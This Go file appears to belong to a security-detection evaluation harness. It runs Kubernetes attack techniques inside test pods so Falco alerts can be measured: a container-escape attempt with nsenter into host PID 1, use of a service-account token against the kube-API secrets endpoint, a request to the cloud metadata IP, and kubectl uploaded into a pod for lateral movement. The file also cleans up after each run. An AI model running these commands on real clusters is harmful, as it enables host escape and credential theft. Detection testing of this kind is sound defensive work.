// Package attack runs the real in-cluster S1-S3 attack techniques against
// the Story 11.1 targets and reverses them. It is shared by olaitan-eval
// (the evaluation runner, behind its frozen Scenario seam) and the e2e
// scenario smoke test, so CI exercises exactly the primitives the
// evaluation runs (Story 11.2a decision L2, 2026-09-30).
package attack

import (
	"bytes"
	"context"
	"crypto/sha256"
	"debug/elf"
	"encoding/hex"
	"fmt"
	"io"
	"log/slog"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// Story 11.2a fills the FROZEN Scenario seam (runner.go) with a REAL
// in-cluster attack executor, replacing the Story 5.2 log-only Run and all
// synthetic NATS-event injection. The executor applies the Story 11.1
// target workload, runs the technique's primitive(s) via `kubectl exec`
// inside the target pod, and tears down exactly what it applied. The attack
// produces genuine syscalls Falco observes, so the signal flows through the
// real bus (Falco -> gRPC -> NATS -> correlator) and the Story 5.4 Capturer
// drains it; nothing is fabricated. S4/S5 (which need attacker-side sink /
// pool infrastructure) land in Story 11.2b (#192).

// Namespace / attackWorkload / attackWaitTimeout / saTokenPath are the
// shared shape of the Story 11.1 targets: each S1-S3 target is a Deployment
// named `web` with selector app=web in the tenant-acme namespace, and the S2
// target projects its ServiceAccount token at the standard mount path.
const (
	Namespace         = "tenant-acme"
	attackWorkload    = "deploy/web"
	attackWaitTimeout = "120s"
	saTokenPath       = "/run/secrets/kubernetes.io/serviceaccount/token"
	kubeAPIHost       = "https://kubernetes.default.svc"
	metadataIP        = "169.254.169.254"
)

// RunFunc runs an external command (kubectl) and returns its trimmed
// stdout plus a clear error on a non-zero exit. Unlike overlayRunFunc
// (error-only) it returns stdout, because the executor needs the in-pod
// command output: specifically the S2 token LENGTH and HASH, which are the
// ONLY things derived from the token that ever leave the pod (the token
// value itself is never in argv, stdout, or a log line). It is the
// injectable shell-out the executor drives (the overlay.go precedent); main
// wires the real ExecCmd, a unit test injects a recorder.
type RunFunc func(ctx context.Context, name string, args ...string) (string, error)

// ExecCmd is the real RunFunc: it runs kubectl and returns
// trimmed stdout, folding stderr into a clear error on a non-zero exit. It
// is small and side-effecting, so it lives behind the injectable runCmd
// field and is exercised by the live e2e path (kind-full + kubeadm), not
// unit-tested directly.
func ExecCmd(ctx context.Context, name string, args ...string) (string, error) {
	cmd := exec.CommandContext(ctx, name, args...)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("%s %s: %w\n%s", name, strings.Join(args, " "), err, strings.TrimSpace(stderr.String()))
	}
	return strings.TrimSpace(stdout.String()), nil
}

// Executor executes one scenario's real in-cluster technique (S1-S3)
// and reverses it. It is built per trial by the scenarioHarness behind the
// frozen Scenario seam.
type Executor struct {
	scenarioID string
	dir        string
	// manifests are the files Execute applies, in apply order. The workload
	// is always present; S2 adds its least-privilege RBAC manifest (DP1).
	manifests []string
	// cleanupRefs are the specific resources Cleanup deletes by name (NOT the
	// shared tenant-acme Namespace, which is tenant infrastructure and is left
	// in place): deleting only what the attack added keeps the reversal
	// surgical and avoids leaving the namespace mid-termination for the next
	// trial or test.
	cleanupRefs []string
	runCmd      RunFunc
	logger      *slog.Logger
	// retryWait is the backoff between apply retries; a field so a unit test
	// can shrink it. Defaults to applyRetryWait.
	retryWait time.Duration
	// SettleWait is how long Execute waits after the primitive before
	// returning (so the deferred Cleanup does not delete the pod before the
	// correlator resolves posture). A field so a unit test can zero it.
	// Defaults to DefaultSettleWait.
	SettleWait time.Duration
	// kubectlBinary is the path to a real, standalone kubectl on the runner
	// host that S3 uploads into the target pod (the attacker brings a real
	// tool). Resolved from PATH by New; a unit test overrides
	// it to assert the exact kubectl cp argv without a real binary.
	kubectlBinary string
	// PrepareKubectl resolves kubectlBinary to the real file S3 uploads and
	// returns its sha256 (decision D2: the runner's own kubectl is the tool,
	// so each run records exactly which binary it used). resolveUploadKubectl
	// by default; a unit test stubs it for a non-existent path.
	PrepareKubectl func(path string) (resolved, sha256hex string, err error)
}

// resolveUploadKubectl follows symlinks to the real kubectl file and refuses
// anything the busybox target pod cannot run as kubectl: a script shim, a
// multicall binary that snap, mise or aqua link as kubectl (the resolved file
// must itself be named kubectl), and a dynamically linked ELF (the pod has no
// loader). It returns the resolved path and the sha256 of that file, streamed
// rather than read into memory.
func resolveUploadKubectl(path string) (string, string, error) {
	if path == "" {
		return "", "", fmt.Errorf("kubectl not found on PATH; S3 uploads the runner's own kubectl, so put a real Linux kubectl on PATH")
	}
	resolved, err := filepath.EvalSymlinks(path)
	if err != nil {
		return "", "", fmt.Errorf("resolve kubectl %q: %w", path, err)
	}
	if filepath.Base(resolved) != "kubectl" {
		return "", "", fmt.Errorf("kubectl %q resolves to %q, which is not a kubectl binary (a snap, mise or aqua shim); put a real Linux kubectl first on PATH", path, resolved)
	}
	f, err := os.Open(resolved)
	if err != nil {
		return "", "", fmt.Errorf("read kubectl %q: %w", resolved, err)
	}
	defer func() { _ = f.Close() }()
	bin, err := elf.NewFile(f)
	if err != nil {
		return "", "", fmt.Errorf("kubectl %q is not an ELF binary (a shim or script cannot run in the target pod); put a real Linux kubectl first on PATH: %w", resolved, err)
	}
	for _, p := range bin.Progs {
		if p.Type == elf.PT_INTERP {
			return "", "", fmt.Errorf("kubectl %q is dynamically linked and the target pod has no loader for it; use a static kubectl (the upstream release binaries are)", resolved)
		}
	}
	if _, err := f.Seek(0, io.SeekStart); err != nil {
		return "", "", fmt.Errorf("rewind kubectl %q: %w", resolved, err)
	}
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", "", fmt.Errorf("hash kubectl %q: %w", resolved, err)
	}
	return resolved, hex.EncodeToString(h.Sum(nil)), nil
}

// New builds the executor for an S1-S3 scenario. An unknown or
// not-yet-implemented scenario (s4/s5 belong to Story 11.2b) is a hard error
// so a mis-wired scenario fails loudly rather than silently no-opping.
func New(scenarioID, dir string, runCmd RunFunc, logger *slog.Logger) (*Executor, error) {
	switch scenarioID {
	case "s1", "s2", "s3":
		// implemented here
	default:
		return nil, fmt.Errorf("attack executor: scenario %q has no S1-S3 technique (Story 11.2a implements s1, s2, s3; s4 and s5 land in Story 11.2b #192)", scenarioID)
	}
	if logger == nil {
		logger = slog.Default()
	}
	if runCmd == nil {
		runCmd = ExecCmd
	}
	var manifests []string
	if scenarioID == "s2" {
		// Apply the least-privilege RBAC (SA + Role, DP1) BEFORE the workload
		// so the s2-attacker ServiceAccount the pod binds to already exists.
		manifests = append(manifests, filepath.Join(dir, "manifests", "rbac.yaml"))
	}
	manifests = append(manifests, filepath.Join(dir, "manifests", "workload.yaml"))

	// Cleanup deletes exactly what the attack added, by name, leaving the
	// shared tenant-acme Namespace in place. The target Deployment is common
	// to S1-S3; S2 also adds the least-privilege SA + Role + RoleBinding.
	cleanupRefs := []string{"deployment/web"}
	if scenarioID == "s2" {
		cleanupRefs = append(cleanupRefs,
			"rolebinding/s2-attacker-secrets-reader",
			"role/s2-secrets-reader",
			"serviceaccount/s2-attacker",
		)
	}
	// Resolve a real, standalone kubectl on the runner host for S3 to upload
	// into the target (a renamed busybox exits 127 on the multicall dispatch).
	// Not on PATH leaves it empty and S3 fails loudly in resolveUploadKubectl;
	// every other step shells out to kubectl too, so no fallback path exists.
	kubectlBinary, _ := exec.LookPath("kubectl")
	return &Executor{
		PrepareKubectl: resolveUploadKubectl,
		scenarioID:     scenarioID,
		dir:            dir,
		manifests:      manifests,
		cleanupRefs:    cleanupRefs,
		runCmd:         runCmd,
		logger:         logger,
		retryWait:      applyRetryWait,
		SettleWait:     DefaultSettleWait,
		kubectlBinary:  kubectlBinary,
	}, nil
}

// Execute applies the target (and the S2 RBAC), waits for it Ready, then runs
// the scenario's technique primitive(s). It does NOT clean up; the caller
// (scenarioHarness.Run) defers Cleanup so teardown runs even on a primitive
// error (the Runner-loop BI-2 discipline).
func (e *Executor) Execute(ctx context.Context) error {
	if err := e.ensureTargetReady(ctx); err != nil {
		return err
	}
	var primErr error
	switch e.scenarioID {
	case "s1":
		primErr = e.runS1(ctx)
	case "s2":
		primErr = e.runS2(ctx)
	case "s3":
		primErr = e.runS3(ctx)
	default:
		return fmt.Errorf("attack executor: no primitive for scenario %q", e.scenarioID) // unreachable (New gate)
	}
	// Settle before returning so the caller's deferred Cleanup does not delete
	// the target before the correlator resolves its workload posture off the
	// live pod (Story 11.2d). Settle even on a primitive error so any alert
	// already emitted still flows; a cancelled context skips the wait.
	e.settle(ctx)
	return primErr
}

// ensureTargetReady applies the target (and the S2 RBAC) and waits for the
// Deployment to roll out, as one retriable unit. applyWithRetry already rides
// out a terminating namespace on the apply itself, but a prior test or trial
// that deleted the shared tenant-acme Namespace with --wait=false can finish
// draining AFTER a successful apply, sweeping the just-created Deployment so
// `kubectl rollout status` fails with "object has been deleted". That is the
// same drain race, surfacing one step later, so it is retried the same way:
// re-apply and wait again. A non-race rollout error (a genuine timeout) is
// returned at once. The always-on e2e job runs the RS smoke (which deletes the
// whole tenant-acme namespace on cleanup) in the process right before the eval
// smoke, so this race is real and recurring, not hypothetical.
func (e *Executor) ensureTargetReady(ctx context.Context) error {
	var lastErr error
	for attempt := 1; attempt <= applyRetries; attempt++ {
		for _, m := range e.manifests {
			if err := e.applyWithRetry(ctx, m); err != nil {
				return fmt.Errorf("apply %s: %w", m, err)
			}
		}
		_, err := e.runCmd(ctx, "kubectl", "rollout", "status", attackWorkload, "-n", Namespace, "--timeout", attackWaitTimeout)
		if err == nil {
			return nil
		}
		lastErr = err
		if !isDeletionRaceError(err) {
			return fmt.Errorf("wait target ready: %w", err)
		}
		e.logger.Warn("target was deleted mid-rollout by a prior cleanup still draining; re-applying",
			"attempt", attempt, "of", applyRetries, "err", err)
		wait := e.retryWait
		if wait <= 0 {
			wait = applyRetryWait
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(wait):
		}
	}
	return fmt.Errorf("wait target ready after %d attempts: %w", applyRetries, lastErr)
}

// settle waits SettleWait (unless it is non-positive or the context is
// already done) so a fired Falco alert flows Falco -> collector -> correlator
// and the correlator resolves workload posture from the still-live pod before
// the deferred Cleanup deletes it.
func (e *Executor) settle(ctx context.Context) {
	if e.SettleWait <= 0 {
		return
	}
	e.logger.Info("settling before cleanup so detection posture resolves off the live pod",
		"scenario", e.scenarioID, "settle", e.SettleWait.String())
	select {
	case <-ctx.Done():
	case <-time.After(e.SettleWait):
	}
}

// targetPod returns the name of the running target pod (app=web) in the
// attack namespace. S3 needs the concrete pod name because kubectl cp cannot
// address a Deployment.
func (e *Executor) targetPod(ctx context.Context) (string, error) {
	// Story 11.2d: skip pods that are terminating or not Running. The previous
	// trial's pod can still be Terminating when this one starts; picking it
	// made S3 upload kubectl into the old pod and exec in the new one.
	out, err := e.runCmd(ctx, "kubectl", "get", "pod", "-n", Namespace,
		"-l", "app=web", "-o",
		`jsonpath={range .items[*]}{.metadata.name}{"|"}{.metadata.deletionTimestamp}{"|"}{.status.phase}{"\n"}{end}`)
	if err != nil {
		return "", err
	}
	for _, line := range strings.Split(out, "\n") {
		f := strings.Split(strings.TrimSpace(line), "|")
		if len(f) == 3 && f[0] != "" && f[1] == "" && f[2] == "Running" {
			return f[0], nil
		}
	}
	return "", fmt.Errorf("no running, non-terminating pod for app=web in %s", Namespace)
}

// DefaultSettleWait is how long Execute waits AFTER the technique primitive
// and BEFORE returning (the caller defers Cleanup, so this delays teardown).
// Story 11.2d: OLT-PRIV-001 and OLT-LATERAL-001 need the workload posture
// (owner_kind=Deployment, namespace) which the correlator resolves
// read-on-demand from the live pod at EvidencePackage assembly time
// (internal/correlator/correlator.go:488). The correlator's sliding window is
// 60s (docs/helm-values.md correlator.windowDuration), but a WARNING+ Falco
// alert (the Olaitan custom rules) crosses falcoTriggerMinPriority and starts
// an investigation on its own before the window closes. The default is sized
// to that trigger path plus margin, measured live in Story 11.2d; deleting
// the pod sooner made owner-resolution miss and the rule never matched. A
// unit test shrinks it via the SettleWait field.
const DefaultSettleWait = 45 * time.Second

// applyRetries / applyRetryWait bound the apply retry loop. A prior test or
// trial that deleted the shared tenant-acme Namespace can leave it briefly
// Terminating, and a create into a terminating namespace is rejected with a
// Forbidden "namespace is being terminated" error. The retry rides that out
// without masking a genuine manifest error (only the terminating / being-
// deleted transient is retried).
const (
	applyRetries   = 6
	applyRetryWait = 5 * time.Second
)

// applyWithRetry runs kubectl apply, retrying only the transient
// namespace-terminating / object-being-deleted races (a prior cleanup still in
// flight). Any other error, or exhausting the retries, is returned.
func (e *Executor) applyWithRetry(ctx context.Context, manifest string) error {
	var lastErr error
	for attempt := 1; attempt <= applyRetries; attempt++ {
		_, err := e.runCmd(ctx, "kubectl", "apply", "-f", manifest)
		if err == nil {
			return nil
		}
		lastErr = err
		if !isTransientApplyError(err) {
			return err
		}
		e.logger.Warn("apply hit a terminating-namespace race; retrying",
			"manifest", manifest, "attempt", attempt, "of", applyRetries)
		wait := e.retryWait
		if wait <= 0 {
			wait = applyRetryWait
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(wait):
		}
	}
	return lastErr
}

// isTransientApplyError reports whether err is the retryable
// namespace-terminating / object-being-deleted race rather than a real
// manifest problem.
func isTransientApplyError(err error) bool {
	if err == nil {
		return false
	}
	msg := strings.ToLower(err.Error())
	return strings.Contains(msg, "being terminated") ||
		strings.Contains(msg, "being deleted") ||
		strings.Contains(msg, "object is being deleted")
}

// isDeletionRaceError reports whether a `kubectl rollout status` failure was
// caused by the target (or its namespace) being deleted out from under the
// wait by a prior cleanup still draining, rather than a genuine rollout
// timeout. "object has been deleted" is kubectl's message when the watched
// Deployment is removed mid-watch; the terminating/not-found variants cover the
// namespace being swept just before or during the wait. Only these are retried
// (re-apply + wait again); a real timeout is surfaced at once.
func isDeletionRaceError(err error) bool {
	if err == nil {
		return false
	}
	msg := strings.ToLower(err.Error())
	return strings.Contains(msg, "has been deleted") ||
		strings.Contains(msg, "not found") ||
		strings.Contains(msg, "no longer exists") ||
		isTransientApplyError(err)
}

// exec runs a shell script inside the target pod via kubectl exec.
func (e *Executor) exec(ctx context.Context, script string) (string, error) {
	return e.runCmd(ctx, "kubectl", "exec", "-n", Namespace, attackWorkload, "--", "sh", "-c", script)
}

// runS1 executes the S1 container-escape technique (MITRE T1611 Escape to
// Host; also T1610). From the privileged (CAP_SYS_ADMIN / CAP_SYS_PTRACE)
// container it attempts to reach the host namespace / filesystem. The
// privileged process alone trips OLT-PRIV-001; the host-reach attempt is the
// T1611 flavour and a read of the host /proc view can also trip OLT-EXEC-001.
// The attempt is read-only recon (nothing on the host is modified), so it is
// reversible by deleting the pod.
func (e *Executor) runS1(ctx context.Context) error {
	script := "echo '[s1] container-escape attempt from privileged pod'; " +
		"nsenter --target 1 --mount --uts --ipc --net --pid -- cat /etc/hostname 2>/dev/null; " +
		"ls -la /proc/1/root/ 2>/dev/null | head -n 5; " +
		"cat /proc/1/cgroup 2>/dev/null | head -n 3; true"
	out, err := e.exec(ctx, script)
	if err != nil {
		return fmt.Errorf("s1 escape primitive: %w", err)
	}
	e.logger.Info("s1 technique executed",
		"mitre", "T1611", "also", "T1610", "rule", "OLT-PRIV-001",
		"detail", "privileged host-escape attempt", "out_len", len(out))
	return nil
}

// runS2 executes the S2 credential-exfil technique. It reads the SA token
// emitting ONLY its length and sha256 (the value never enters argv, stdout,
// or a log line, hard rule); uses the token against the kube-API with the
// least-privilege SA, printing only the HTTP status (never the response
// body, so no cluster secret is dumped); and requests the cloud
// instance-metadata IP. MITRE: T1552 (OLT-CRED-001 token read), T1552.007
// (kube-API use), T1552.005 (OLT-CRED-002 metadata IP); also T1528.
func (e *Executor) runS2(ctx context.Context) error {
	readScript := "wc -c < " + saTokenPath + "; sha256sum " + saTokenPath + " | cut -d' ' -f1"
	out, err := e.exec(ctx, readScript)
	if err != nil {
		return fmt.Errorf("s2 token read: %w", err)
	}
	tlen, thash := parseTokenLenHash(out)
	e.logger.Info("s2 token read (value never logged)",
		"mitre", "T1552", "also", "T1528", "rule", "OLT-CRED-001",
		"token_len", tlen, "token_sha256", thash)

	apiScript := "TOKEN=$(cat " + saTokenPath + "); " +
		"curl -s -o /dev/null -w '%{http_code}' -k --max-time 5 " +
		"-H \"Authorization: Bearer $TOKEN\" " +
		kubeAPIHost + "/api/v1/namespaces/" + Namespace + "/secrets"
	status, err := e.exec(ctx, apiScript)
	if err != nil {
		e.logger.Warn("s2 kube-API use returned an error (still a real attempt)", "err", err)
	} else {
		e.logger.Info("s2 kube-API use", "mitre", "T1552.007", "http_status", status)
	}

	metaScript := "curl -s -o /dev/null -w '%{http_code}' --max-time 3 http://" + metadataIP + "/latest/meta-data/ || true"
	mstatus, err := e.exec(ctx, metaScript)
	if err != nil {
		e.logger.Warn("s2 metadata request returned an error (still a real attempt)", "err", err)
	} else {
		e.logger.Info("s2 metadata IP request", "mitre", "T1552.005", "rule", "OLT-CRED-002", "http_status", mstatus)
	}
	return nil
}

// runS3 executes the S3 lateral-movement technique (MITRE T1613 Container and
// Resource Discovery; also T1609 Container Administration Command). The
// kubectl exec into the tenant pod is itself T1609; then it launches a
// /kubectl-named process IN-POD so OLT-LATERAL-001 fires (process.exe ends
// /kubectl in a tenant Deployment pod).
//
// Story 11.2d fix: the target ships no kubectl, so the attacker brings a REAL
// one. The prior primitive copied the in-pod busybox to /tmp/kubectl and ran
// it, which exited 127 because busybox is a multicall binary that dispatches
// on argv[0] and has no "kubectl" applet, so no /kubectl process ever execd
// and OLT-LATERAL-001 could not fire on the real path. Now the runner uploads
// a real, standalone kubectl from the runner host into the pod with kubectl
// cp (busybox provides tar, which cp needs; the transfer streams over the API
// server exec channel, so nothing leaves the cluster, hard rule) and execs
// it. proc.exepath is then /tmp/kubectl, which ends /kubectl.
func (e *Executor) runS3(ctx context.Context) error {
	pod, err := e.targetPod(ctx)
	if err != nil {
		return fmt.Errorf("s3 resolve target pod: %w", err)
	}
	prepare := e.PrepareKubectl
	if prepare == nil {
		prepare = resolveUploadKubectl
	}
	src, sum, err := prepare(e.kubectlBinary)
	if err != nil {
		return fmt.Errorf("s3 kubectl to upload: %w", err)
	}
	e.logger.Info("s3 uploading runner kubectl", "path", src, "sha256", sum)
	if _, err := e.runCmd(ctx, "kubectl", "cp", src,
		Namespace+"/"+pod+":/tmp/kubectl", "-c", "web"); err != nil {
		return fmt.Errorf("s3 stage real kubectl into pod: %w", err)
	}
	// Exec the uploaded real kubectl. --client keeps it offline (no API call,
	// no egress); the point is the /kubectl-named execve Falco observes.
	// Exec in the SAME pod the binary was uploaded to (not deploy/web, which
	// kubectl may resolve to a different pod of the Deployment).
	out, err := e.runCmd(ctx, "kubectl", "exec", "-n", Namespace, pod, "-c", "web", "--",
		"sh", "-c", "chmod +x /tmp/kubectl && /tmp/kubectl version --client 2>&1")
	if err != nil {
		return fmt.Errorf("s3 in-pod kubectl primitive: %w", err)
	}
	version, _, _ := strings.Cut(strings.TrimSpace(out), "\n")
	e.logger.Info("s3 technique executed",
		"mitre", "T1613", "also", "T1609", "rule", "OLT-LATERAL-001",
		"detail", "kubectl exec + uploaded real /tmp/kubectl process",
		"kubectl_version", version, "out_len", len(out))
	return nil
}

// Cleanup deletes exactly what Execute added, by name, idempotent
// (--ignore-not-found). It deletes the attacker resources (the target
// Deployment, and for S2 the least-privilege SA + Role + RoleBinding) but NOT
// the shared tenant-acme Namespace, which is tenant infrastructure: deleting
// only what the attack added keeps the reversal surgical and never leaves the
// namespace mid-termination for the next trial or test. It is safe to call
// after a partial or failed Execute and safe to call more than once (AC2
// reversibility). A delete error is returned but does not stop the others.
func (e *Executor) Cleanup(ctx context.Context) error {
	var firstErr error
	for _, ref := range e.cleanupRefs {
		if _, err := e.runCmd(ctx, "kubectl", "delete", ref, "-n", Namespace, "--ignore-not-found", "--wait=false"); err != nil {
			if firstErr == nil {
				firstErr = fmt.Errorf("delete %s: %w", ref, err)
			}
			e.logger.Error("cleanup delete failed", "resource", ref, "err", err)
		}
	}
	return firstErr
}

// parseTokenLenHash parses the "<len>\n<sha256>" output of the S2 token-read
// primitive. It never receives the token value (the in-pod command emits
// only the length and the hash). A malformed line yields zero/empty, which
// the caller logs as-is (still no token value).
func parseTokenLenHash(out string) (length, hash string) {
	lines := strings.Split(strings.TrimSpace(out), "\n")
	if len(lines) > 0 {
		length = strings.TrimSpace(lines[0])
	}
	if len(lines) > 1 {
		hash = strings.TrimSpace(lines[len(lines)-1])
	}
	return length, hash
}
